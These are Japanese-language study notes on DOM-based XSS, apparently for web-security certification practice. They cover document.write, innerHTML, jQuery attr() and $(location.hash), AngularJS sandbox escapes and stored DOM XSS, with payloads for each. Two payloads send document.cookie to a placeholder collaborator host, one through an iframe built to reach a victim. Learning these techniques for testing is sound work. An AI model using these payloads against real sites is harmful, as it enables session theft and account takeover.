#### DOM based XSSとは

###### 他のタイプのXSSとの違い

- [2. 反射型XSS](2.%20反射型XSS.md)や[3.持続型XSS](3.持続型XSS.md)はサーバのコードの不備が原因だが、これはフロントエンドのコードの不備が原因
- ==サーバを介さない==ので検知が難しい上に、JSのコードが攻撃者から閲覧可能で攻撃のベクターを解析されやすい
	- つまりプロキシでインターセプトしないで開発者ツールを主に使う

- ⚠️： Chrome、Firefox、Safariはソースに配置された値をURLエンコードするので、DOM based XSSが動作しにくい(IEやMicrosoftEdgeは動作しやすい)

###### DOM based XSSの基本な仕組み

- DOM-based XSSの原因になるブラウザの機能はソースとシンクに分類される
- つまり、DOM based XSSを行うには、ペイロードをソースに配置し、それがシンクに渡り、任意のJSが実行されるようにする

- 一般的なソースはURLで`window.location`オブジェクトでアクセスされる。
 - クエリ文字列やフラグメント(`#`)にペイロードを注入してリンクを作成し、被害者へ送る

- 404ページやPHPを実行しているWebサイトにはペイロードをURLパスに置く。

## それぞれのソースとシンクでのDOM XSS実施

- DevToolsのConsoleタブを開いてエラーなど観測してcontextを調整しながら

### 基本

#### sinks: document.write

- `script`要素で動作するのでシンプル
```js
document.write('... <script>document.location="https://COLLABORATOR_DOMAIN/?domxss="+document.cookie</script> ...');
```

- しかし、`document.write`に書き込む際にコンテキストを考慮する必要があるかも。
- 例えば、JSのペイロードを使用する前に、既存の要素をクォテーションなど閉じるなど

例1: 
```js
<script>
	var searchTerms = 'hoge';
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
	↓
```js
'><script>alert(1)</script>
```
- もしHTMLエンコードされるなら[💥XSS](../../../OSCP/Cheatsheet/Web%20App/💥XSS.md#インプットがHTMLエンコードされる)

例2: source `location.search` inside a select element
```js
<script>
	var stores = ["London","Paris","Milan"];
	var store = (new URLSearchParams(window.location.search)).get('storeId');
	document.write('<select name="storeId">');
	if(store) {
		document.write('<option selected>'+store+'</option>');
	}
	for(var i=0;i<stores.length;i++) {
		if(stores[i] === store) {
			continue;
		}
		document.write('<option>'+stores[i]+'</option>');
	}
	document.write('</select>');
</script>
```
	↓
```
https://TARGET_NET/product?productId=3&storeId="><script>alert(1)</script>
```

- [github cheatsheet](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#doc-write-location-search)

#### sinks: innerHTML

- Tags: `<img>` or `<iframe>`
- Events: `onerror` or `onload`
```js
element.innerHTML='... <img src=1 onerror=alert(1)> ...'
```

### jQuery

#### attr()

###### attr()悪用ステップ

1. `attr()`を探す
2. どの要素をどの値で書き換えているか把握する
3. 値をペイロードで上書きする
```
?returnUrl=javascript:alert(1)
```
- `javascript:alert(1)`は、urlに組み込むXSSペイロード

###### attr()の基本と挙動

- DOM要素の[📕](../../Misc/📕.md#attribute(属性))を変更できる
- ↓例："href"属性をクエリストリングのreturnUrlパラメタから取得した値に変更している
```js
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

#### $()

###### 基本概念

- `$()`：シンク
1. `$(ソース)`を見つける
2. 入力した値にアクセスさせる方法が存在するか考え、ペイロードを注入する

###### 具体的な$(location.hash)悪用ステップ

1. `$(location.hash)`があることを見つけて、実行条件(ここではハッシュが変更されたとき)を明らかにする。加えて、ハッシュ(=フラグメント）の値にアクセスするか確認する。
```js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

2. no user interactionでhashchangeイベントを発火させるペイロードをvictimにdeliverする
```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

###### $(location.hash)の基本と挙動

- `location.hash:` `#`:フラグメントに指定した値を取得する
- `$()`はセレクタ。[参考記事：全セレクタまとめ](https://stand-4u.com/web/javascript/jquery-selector.html)
- 比較的新しいverのjQueryではセレクタにHTMLを注入できないようにしている

- [hashchange](https://developer.mozilla.org/ja/docs/Web/API/Window/hashchange_event)イベントハンドラとともに実装されてることが多い。このイベントハンドラはハッシュが変更されたときに発火する。変更されたハッシュの値に`scrollIntoView()`でアクセスする
```js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

- 悪用例
```
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```
- `this.src+=`: `this`は`iframe`を指している。`iframe`の`src`に値を追加するという意味
- `#`のあとに値を追加＝`hashchange`の発火で`$(location.hash)`にペイロードが注入され、

### AngularJS

###### AngularJSの基本

- AngularJSの場合、`<>`やeventがなくてもJSを実行できる可能性がある
- AngularJSはHTMLテンプレート内に動的なデータを表示することが可能
- クライアント側で以下のようにHTML内に二重波括弧を書くと、開発者が事前に設定したプロパティ(name)の値に置き換えてくれる。  (この表記法をエクスプレッションという)
```js
<!-- {{ name }}の部分が置き換わります -->
<div ng-controller="NameController">
    <p class="name">私の名前は{{ name }}です。</p>
</div>
```

- `ng-app`という属性の表記があると、その要素の内容をAngularJSがスキャンする
```
<要素 ng-app="{angular.Module}">
   ...
</要素>
```

#### ステップ

1. `ng-app` を探し、AngularJSが実行されていることを確認する
2. ユーザが入力した内容が`ng-app`属性を付与したタブ内にあるか確認する
3. [cheat sheet: AngularJS sandbox escapes reflected](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected)を参考にペイロードを入力して実行する
```
{{$on.constructor('alert(1)')()}}
```
4. エクスプロイトサーバに以下をホストしてdeliver
```html
<iframe src="https://TARGET_NET/?[vuln_param]=<@urlencode_not_plus>{{$on.constructor('document.location="https://COLLABORATOR_DOMAIN?c="+document.cookie')()}}<@/urlencode_not_plus>
```

### 持続型DOM XSS

###### 持続型DOM XSSが疑われるケース

- 入力した値がサーバに保存されてWebアプリに反映されている(持続型XSSと同じ)
- 保存されたデータが後のレスポンスで返り、レスポンスに含まれるscriptにシンクがある
- シンクで入力したデータを処理している
```js
element.innerHTML = comment.author
```

###### JSのreplace()でエスケープしてるとき、最初の文字しかヒットしないので抜けられる

Source
```jsx
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```
に対し、
```jsx
<><img src=1 onerror=alert(1)>
```
でpayloadを実行できる
